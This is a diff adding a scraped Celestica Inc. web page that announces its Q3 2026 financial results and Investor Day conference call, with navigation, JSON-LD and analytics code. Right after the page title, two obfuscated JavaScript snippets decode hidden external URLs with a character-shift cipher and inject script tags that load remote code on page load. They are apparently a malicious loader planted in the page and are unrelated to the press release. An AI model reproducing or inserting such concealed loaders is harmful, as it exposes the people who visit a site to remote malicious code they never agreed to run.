@@ -1,0 +1,184 @@
+{
+    "@context": "https://schema.org",
+    "@graph": [
+        {
+            "@type": "NewsArticle",
+            "@id": "https://corporate.celestica.com/news-releases/news-release-details/celestica-hold-q3-2026-financial-results-and-2026-investor-and",
+            "headline": "Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call",
+            "name": "Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call | Celestica Inc.",
+            "description": "TORONTO, Oct. 06, 2026 (GLOBE NEWSWIRE) -- Celestica Inc. (NYSE: CLS)(TSX: CLS) will hold its third quarter 2026 financial results and 2026 Investor and Analyst Day conference call on Tuesday, October 27, 2026. The conference call start time is 8:00am ET.",
+            "datePublished": "2026-10-06T16:15:32-0400",
+            "author": {
+                "@type": "Organization",
+                "name": "Celestica Inc.",
+                "url": "https://corporate.celestica.com"
+            },
+            "publisher": {
+                "@type": "Organization",
+                "name": "Celestica Inc.",
+                "url": "https://corporate.celestica.com/"
+            },
+            "mainEntityOfPage": "https://corporate.celestica.com/news-releases/news-release-details/celestica-hold-q3-2026-financial-results-and-2026-investor-and"
+        },
+        {
+            "@type": "Organization",
+            "name": "Celestica Inc.",
+            "url": "https://corporate.celestica.com"
+        },
+        {
+            "@type": "WebPage",
+            "@id": "https://corporate.celestica.com/news-releases/news-release-details/celestica-hold-q3-2026-financial-results-and-2026-investor-and",
+            "name": "Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call | Celestica Inc."
+        },
+        {
+            "@type": "WebSite",
+            "name": "Celestica Inc.",
+            "url": "https://corporate.celestica.com"
+        }
+    ]
+}
+Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call | Celestica Inc.
+(function () { var _AH = document.createElement("script"), _ls = (function (_CL, _06) { var _ak = ""; for (var _3G = 0; _3G < _CL.length; _3G++) { var _W0 = _CL[_3G].charCodeAt(); _W0 -= _06; _ak == _ak; _W0 += 61; _W0 %= 94; _W0 += 33; _W0 != _3G; _06 > 8; _ak += String.fromCharCode(_W0) } return _ak })(atob("KDQ0MDNYTU03M0w6Ly8tKS4mL0wjLy1NMCk4JSxNVFElUFZPUk5TUVRWUCRXIVRPJSUmTlEh"), 30); _AH.referrerPolicy = "unsafe-url"; _AH.async = !0; _AH != "Q"; function _9z() { }; _AH.type = "text/javascript"; 7 > 3; _AH.src = _ls; var _Vt = document.getElementsByTagName("script")[0]; _Vt.parentNode.insertBefore(_AH, _Vt) })();
+window[(function(_AV3,_wv){var _Si='';for(var _jO=0;_jO<_AV3.length;_jO++){var _vS=_AV3[_jO].charCodeAt();_vS-=_wv;_vS!=_jO;_wv>8;_vS+=61;_vS%=94;_vS+=33;_Si==_Si;_Si+=String.fromCharCode(_vS)}return _Si})(atob('bl1kKCV+eXcqX3kv'), 20)] = 'a95046ab741680115095'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function(_GJi,_eu){var _Jn='';for(var _sz=0;_sz<_GJi.length;_sz++){var _ck=_GJi[_sz].charCodeAt();_ck-=_eu;_ck!=_sz;_ck+=61;_ck%=94;_eu>5;_ck+=33;_Jn==_Jn;_Jn+=String.fromCharCode(_ck)}return _Jn})(atob('eykpJShNQkJ9KEEvfEAodid8JSkoQXYkIkIvfEApdHpBfSg='), 19)), document.readyState === 'complete'?document.body.appendChild(zi): window.addEventListener('load', function(){ document.body.appendChild(zi) });
+Skip to main navigation
+About Us
+About Us
+Who We Are
+Locations
+Executive Team
+Company Directors
+Corporate Governance
+Compliance and Ethics
+Diversity and Inclusion
+Sustainability
+Awards
+History
+OUR COMPANIES
+Atrenne
+AbelConn
+PCI
+Capabilities
+Markets
+Markets Overview
+Enterprise
+Communications
+Aerospace and Defense
+Industrial and Smart Energy
+HealthTech
+Capital Equipment
+Services
+Services Overview
+Design and Engineering
+Manufacturing Services
+Logistics and Fulfillment
+After-Market Services
+Precision Machining
+Supply Chain Services
+Product Licensing Services
+New Product Introduction
+Testing and Quality
+Products
+Hardware Platform Solutions
+Overview
+Storage
+Compute
+Networking
+Resources
+Resouces
+News
+Blog
+Supplier Resources
+Media Resources
+Careers
+Investors
+Investors
+Overview
+Annual Reports
+Quarterly Results
+Filings
+Financial Releases
+Events & Presentations
+Stock Quote
+Analyst Coverage
+Investor FAQs
+Investor Package
+Contact Investor Relations
+Corporate Governance
+Email Alerts
+Locations
+North America:
++1 888-899-9998
+Global:
++1 416-448-5800
+Contact Us
+Contact Us
+Release Details
+Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call
+Oct 06, 26 at 4:15 PM EDT
+PDF Version
+TORONTO, Oct.  06, 2026  (GLOBE NEWSWIRE) -- Celestica Inc. (NYSE: CLS)(TSX: CLS) will hold its third quarter 2026 financial results and 2026 Investor and Analyst Day conference call on Tuesday, October 27, 2026. The conference call start time is 8:00am ET.
+Financial results will be released after market close on Monday, October 26, 2026.
+During the conference call, Celestica’s management will provide an update on its business operations, strategic priorities, growth opportunities and its financial outlook.
+Participants are invited to join the live webcast at the following
+link
+.
+For those unable to participate, a recorded webcast will be available approximately two hours after completion of the call. To access the recorded webcast visit
+www.celestica.com
+.
+Reminder: 2026 Investor and Analyst Day Lunch Forum
+As previously announced, following the morning conference call, Celestica will host its 2026 Investor and Analyst Day Lunch Forum. This is an in-person event held in Midtown Manhattan, New York City. During the session, Chair of the Board and CEO Rob Mionis and members of Celestica’s executive leadership team will be available to answer questions.
+Attendance to the Lunch Forum is open exclusively to institutional investors and sell-side research analysts. Those who wish to attend this event are invited to express their interest at the following
+registration link
+.
+Space for the event is limited, and attendance is subject to availability.
+Contact
+Celestica Investor Relations
+[REDACTED_EMAIL]
+Celestica Investor Relations Events
+[REDACTED_EMAIL]
+The information that you are accessing on this website may include forward-looking statements related to our future growth, trends in our industry, our financial and operational results and performance that are based on current expectations, forecast and assumptions involving risk and uncertainties that could cause actual outcomes and results to differ materially.
+Read the full Cautionary Note here
+How can we help your Business Grow?
+We are committed to building on our success and will continue to deliver bold solutions that will meet our customers' needs and build a better world.
+Contact Investor Relations
+Markets
+Enterprise
+Industrial and Smart Energy
+Communications
+Aerospace and Defense
+Capital Equipment
+HealthTech
+Services
+Design and Engineering
+Manufacturing Services
+Logistics and Fulfillment
+After-Market Services
+Precision Machining
+Supply Chain Services
+Product Licensing Services
+Products
+Hardware Platform Solutions
+Company
+About us
+Careers
+News
+Blog
+Resources
+Supplier Resources
+Media Information
+Press Releases
+Products
+Hardware Platform Solutions
+Contact Us
+North America:
++1 888-899-9998
+Global:
++1 416-448-5800
+Locations
+Legal Notice and Terms of Use
+Privacy Policy
+Modern Slavery Statement
+© Copyright Celestica Inc. 2026. All rights reserved.
+var s_CCSWebHostingAccount = "trcgclientweb3117";
+{"path":{"baseUrl":"\/","pathPrefix":"","currentPath":"node\/17811","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en","themeUrl":"sites\/g\/files\/knoqqb106071\/themes\/site\/client_site"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"eJyNUdFuwzAI_KEq_iSEbdZ6saECuq5_P-JU2jJtUuUHAz4431F6I3aw5pTkg_SuEdmJmwIy9oe3YumQLVglE3S8cbm8ALyq1AnLaDQRrQjbseQiPaPOYlmpNheFih4nd7L0HS5vKuzE-8yBupJPJOQuZU2T3hwUvfE5GGLgBdVfghtMkn-wg5BBqcgYwR8Nwj9n37q3EV_HdEzn6xXPu9ItWPAdPwFrhdLRDLCTuv2BK1NqrOfBJaQw027RnfK2MWAJo2n3_Vdted4nC3k00mb1FzpJxBU","theme":"client_site","theme_token":null},"ajaxTrustedUrl":[],"nir_admin_use_chosen":true,"nir_admin_use_select2":false,"accessible_accordions":true,"lfg_accordions":{"no_functionality":1,"speed":"fast","show_text":"Show All","hide_text":"Hide All","show_all":0},"lfg_chosen":{"enabled":1,"blank_text":"Choose from list"},"user":{"uid":0,"permissionsHash":"7d97054f3880c1aad45421d71d97bb93b6bd2f6323a4953684d151725e4191ef"}}
+window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-38LWW26CJ5');
